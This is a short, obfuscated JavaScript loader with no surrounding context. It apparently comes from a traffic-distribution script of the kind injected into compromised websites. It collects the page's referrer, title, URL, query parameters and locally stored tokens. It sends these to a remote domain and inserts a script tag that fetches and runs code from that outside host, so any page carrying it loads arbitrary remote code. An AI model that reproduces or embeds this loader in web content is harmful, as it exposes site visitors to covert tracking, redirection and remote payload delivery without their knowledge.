    (function() {
    var name = '_67LMG2s3VMX71cmw';
    if (!window._67LMG2s3VMX71cmw) {
        window._67LMG2s3VMX71cmw = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://radioapostolusa.com/pJhktJ',
            P_PATH: 'https://radioapostolusa.com/79f10ac/postback',
        };
    }
    const _tGvKbh8JvJvBhmFw = localStorage.getItem('config');
    if (typeof _tGvKbh8JvJvBhmFw !== 'undefined' && _tGvKbh8JvJvBhmFw !== null) {
        var _4V9vRDvT7bRp4RZg = JSON.parse(_tGvKbh8JvJvBhmFw);
        var _K542SbqM5SgzbDW9 = Math.round(+new Date()/1000);
        if (_4V9vRDvT7bRp4RZg.created_at + window._67LMG2s3VMX71cmw.ttl < _K542SbqM5SgzbDW9) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _5647CnsRWT15zjcQ = localStorage.getItem('subId');
    var _6CCF91R1xDPftM4n = localStorage.getItem('token');
    var _NHsCDhgkXQMZ9qgd = '?return=js.client';
        _NHsCDhgkXQMZ9qgd += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _NHsCDhgkXQMZ9qgd += '&se_referrer=' + encodeURIComponent(document.referrer);
        _NHsCDhgkXQMZ9qgd += '&default_keyword=' + encodeURIComponent(document.title);
        _NHsCDhgkXQMZ9qgd += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _NHsCDhgkXQMZ9qgd += '&name=' + encodeURIComponent(name);
        _NHsCDhgkXQMZ9qgd += '&host=' + encodeURIComponent(window._67LMG2s3VMX71cmw.R_PATH);
    if (typeof _5647CnsRWT15zjcQ !== 'undefined' && _5647CnsRWT15zjcQ && window._67LMG2s3VMX71cmw.unique) {
        _NHsCDhgkXQMZ9qgd += '&sub_id=' + encodeURIComponent(_5647CnsRWT15zjcQ);
    }
    if (typeof _6CCF91R1xDPftM4n !== 'undefined' && _6CCF91R1xDPftM4n && window._67LMG2s3VMX71cmw.unique) {
        _NHsCDhgkXQMZ9qgd += '&token=' + encodeURIComponent(_6CCF91R1xDPftM4n);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._67LMG2s3VMX71cmw.R_PATH + _NHsCDhgkXQMZ9qgd;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
